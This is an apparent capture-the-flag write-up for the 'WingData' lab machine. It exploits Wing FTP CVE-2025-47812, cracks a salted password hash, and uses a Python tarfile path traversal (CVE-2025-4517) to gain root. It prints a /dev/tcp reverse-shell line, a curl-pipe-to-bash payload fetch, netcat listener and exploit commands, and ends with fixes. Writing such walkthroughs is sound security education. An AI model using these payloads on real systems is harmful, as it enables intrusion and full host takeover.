**Difficulty:** Easy  
**OS:** Linux    
**Author:** Ghaith Al-bayati 

## Introduction

WingData is a custom Linux machine that demonstrates how a chain of distinct vulnerabilities leads to complete host takeover. The box starts with an unauthenticated Remote Code Execution (RCE) flaw in a corporate file transfer portal, escalates via credential exposure within internal configuration files, and finishes with a path traversal attack exploiting a vulnerable Python component via a privileged script to achieve root on the underlying host.

**Key skills practiced:**

- Web reconnaissance 
    
- Authentication bypass via null-byte truncation
    
- Configuration analysis and salted password hash cracking
    
- Privilege escalation using Python-based archive path traversal
    

## Vulnerabilities Exploited

|**CVE**|**Service**|**Impact**|
|---|---|---|
|CVE-2025-47812|Wing FTP Server v7.4.3|Unauthenticated Remote Code Execution via null-byte session injection|
|N/A|Wing FTP Server Config|Credential disclosure and salted SHA-256 hash cracking|
|CVE-2025-4517|Python `tarfile` module|Path traversal via privileged sudo execution → arbitrary file write|

## Phase 1: Reconnaissance & Enumeration

### Port Scanning

I started with a detailed Nmap scan to discover open ports and identify the services running on them:

Bash

```
nmap -sC -sV -T4 <TARGET_IP>
```

The scan revealed two open ports:

|**Port**|**Service**|**Version**|
|---|---|---|
|22|SSH|OpenSSH|
|80|HTTP|N/A|

### Web Enumeration & Subdomain Fuzzing

The target domain resolves to `wingdata.htb`. Visiting the landing page at `http://wingdata.htb` presents a standard corporate file transfer portal. Clicking on **Client Portal** exposes a separate subdomain: `ftp.wingdata.htb`. Since this local lab domain is not publicly resolvable, I mapped both entries into the `/etc/hosts` file:

Bash

```
echo "<TARGET_IP> wingdata.htb ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

Navigating directly to `[http://ftp.wingdata.htb](http://ftp.wingdata.htb)` loads a Wing FTP Server login panel, which explicitly prints the running software version on the page:

```
Wing FTP Server v7.4.3
```

Searching public records for this specific software version immediately surfaces multiple high-severity vulnerabilities, notably **CVE-2025-47812**, which has an available public Proof-of-Concept (PoC) under [EDB-52347](https://www.exploit-db.com/exploits/52347).

## Phase 2: Initial Access — CVE-2025-47812

### Understanding the Vulnerability

The critical vulnerability resides within the authentication handler exposed at `/login.html`. The server utilizes an internal function named `c_CheckUser()` to validate the username parameter. This function calls standard C `strlen()`, which instinctively stops parsing whenever it encounters a null byte (`\0`).

By supplying an input embedded with a null byte (such as `anonymous\0<lua_payload>`), the string truncation ensures the authentication check validates cleanly against the default `anonymous` account. Concurrently, the application writes everything trailing the null byte directly into a session file on disk as raw Lua commands. When the server subsequently initializes that session file, the arbitrary Lua code executes automatically under the contexts of the FTP service daemon — running as `root` on Linux deployments by default.

### Exploitation

To catch the inbound session, I staged a malicious script named `shell.sh` on my attack machine containing an interactive bash shell loop:

Bash

```
# shell.sh
bash -i >& /dev/tcp/10.10.15.123/4444 0>&1
```

I hosted this payload via a local Python-based HTTP server on port 8080:

Bash

```
python3 -m http.server 8080
```

Next, I initialized a standard netcat listener on local port 4444:

Bash

```
nc -lvnp 4444
```

Finally, I initiated the execution script. Piping the downloaded payload straight into `bash` allows the inline Lua code injection to remain compact, preventing sudden session dropouts from heavier payloads:

Bash

```
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb \
  -c "curl http://10.10.15.123:8080/shell.sh|bash" -v
```

The payload successfully executed, granting an initial interactive terminal context as the service account `wingftp`:

```
wingftp@wingdata:~$
```

## Phase 3: Lateral Movement — `wingftp` → `wacky`

### Credential Discovery

Wing FTP Server maintains individual localized configuration schema across various user profiles using structured XML logs stored directly in its primary installation data path. I navigated to the active user configurations directory to inspect the storage profiles:

Bash

```
wingftp@wingdata:/opt/wftpserver/Data/1/users$ ls
```

The directory exposed four discrete user files alongside the baseline anonymous profile. Inspecting `wacky.xml` revealed a populated hash string enclosed within the password element tags:

Bash

```
wingftp@wingdata:/opt/wftpserver/Data/1/users$ cat wacky.xml
```

XML

```
<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
  <USER>
    <UserName>wacky</UserName>
    <EnableAccount>1</EnableAccount>
    <EnablePassword>1</EnablePassword>
    <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
    ...
  </USER>
</USER_ACCOUNTS>
```

### Hash Identification & Cracking

The recovered 64-character hex string signifies a standard SHA-256 structure. Attempting a direct dictionary attack using the `rockyou.txt` wordlist via mode `-m 1400` yielded no results, indicating a custom salt implementation. Wing FTP Server constructs user hashes by appending a hardcoded static string sequence (`WingFTP`) directly to the end of the plaintext input prior to running the cryptographic process (`sha256($pass.$salt)`). This particular formatting aligns with Hashcat's specialized mode **1410**.

I compiled the target data using the mandatory `hash:salt` structural syntax required by Hashcat:

Bash

```
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > hash.txt
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
```

The recovery process cracked the string in roughly 8 seconds:

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5

Status: Cracked
```

### SSH Access & User Flag

Leveraging these cracked credentials, I initiated a secure remote connection to the core machine instance via SSH:

Bash

```
ssh wacky@wingdata.htb
# Password: !#7Blushing^*Bride5
```

The credentials authenticated correctly, opening up direct system access as the local account `wacky`:

Bash

```
wacky@wingdata:~$ cat user.txt
6e8dff************************
```

**User flag captured.**

## Phase 4: Privilege Escalation — `wacky` → `root` (CVE-2025-4517)

### Sudo Enumeration

I performed an initial enumeration check of administrative privileges linked to my current user context:

```
wacky@wingdata:~$ sudo -l
```

```
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,
    use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The query output indicates `wacky` can run a localized Python backup utility tool as `root` without password confirmation, completely bypassing strict parameter checks due to a wildcard (`*`) execution rule. Reviewing the internal functions of `restore_backup_clients.py` shows that it parses and decompresses incoming `.tar` file archives placed in `/opt/backup_clients/backups/` natively via Python’s built-in `tarfile` library extension.

### Understanding the Vulnerability

The underlying flaw stems from **CVE-2025-4517**, a path traversal vulnerability present inside Python's core `tarfile` component. When extracting an archive, a malicious actor can chain structural directory layers, symbolic path linkages, and embedded hardlinks to systematically trick the un-sandboxed routine into breaking away from the intended target folder structure. This design gap allows an attacker to alter arbitrary system files on the disk, such as the localized `/etc/sudoers` privilege registry, whenever the operations run inside a high-privilege administrative context. Since the script handles files under an absolute root runtime context and targets a folder location controllable by `wacky`, all prerequisite exploitation requirements are fully met.

### Exploitation

I fetched the relevant automated exploit [PoC](https://github.com/AzureADTrent/CVE-2025-4517-POC) script from my local deployment server onto the target machine's temporary storage path:

Bash

```
wacky@wingdata:/tmp$ wget http://10.10.15.123:8080/CVE-2025-4517-POC.py
```

I then executed the Python routine to initiate the multi-stage overwrite sequence:

Bash

```
wacky@wingdata:/tmp$ python3 CVE-2025-4517-POC.py
```

The exploitation payload loops through five separate operational stages automatically:

```
[*] Target user: wacky
[*] Phase 1: Building nested directory structure...
[*] Phase 2: Creating symlink chain for path traversal...
[*] Phase 3: Creating escape symlink to /etc...
[*] Phase 4: Creating hardlink to /etc/sudoers...
[*] Phase 5: Writing sudoers entry...
[+] Exploit tar created: /tmp/cve_2025_4517_exploit.tar
[*] Deploying exploit to: /opt/backup_clients/backups/backup_9999.tar
[+] Exploit deployed successfully
[*] Triggering extraction via vulnerable script...
[+] Extraction completed
[*] Verifying exploit success...
[+] SUCCESS! User 'wacky' added to sudoers
[+] Entry: wacky ALL=(ALL) NOPASSWD: ALL

[+] EXPLOITATION SUCCESSFUL!
[?] Spawn root shell now? (y/n): y
```

The exploitation tool mounts the specially-crafted archive file directly inside the monitored backup repository folder, then automatically prompts the system utility script via `sudo`. When the privileged process decodes the payload, path traversal forces a raw insertion string (`wacky ALL=(ALL) NOPASSWD: ALL`) straight into `/etc/sudoers`.

The script immediately dropped into an elevated root context command prompt shell, allowing access to the final system target flag:

```
root@wingdata:/tmp# cd ~
root@wingdata:~# cat root.txt
97edb************************
```

**Root flag captured. Box owned.**

## Lessons Learned & Defensive Summary

|**Vulnerability**|**Root Cause**|**How to Fix**|
|---|---|---|
|CVE-2025-47812|The `c_CheckUser()` function verifies input sizes using C `strlen()`, dropping inputs at null bytes (`\0`) and allowing subsequent execution of trailing Lua parameters inside session files.|Sanitise all inbound parameters to reject null bytes before passing values into internal authentication functions. Ensure the service daemon isolates privileges rather than running as root by default.|
|Weak Configuration Hashing|Relying on a weak `sha256($pass.$salt)` scheme with a hardcoded static salt string (`WingFTP`) makes user data susceptible to swift dictionary attacks.|Upgrade the authentication pipeline to employ modern, dynamic, and adaptive stretching hashing protocols (e.g., Argon2id or bcrypt) using unique per-user salts.|
|CVE-2025-4517|The default Python `tarfile` component does not natively filter file paths against embedded traversal attacks, symlink trees, or localized hardlinks during high-privilege compression tasks.|Upgrade underlying Python environments to versions featuring fixed extraction parameters, or explicitly audit file structures before extraction. Avoid implementing loose wildcard parameters (`*`) in administrative `sudo` validation rules.|

_Write-up completed May 2026_
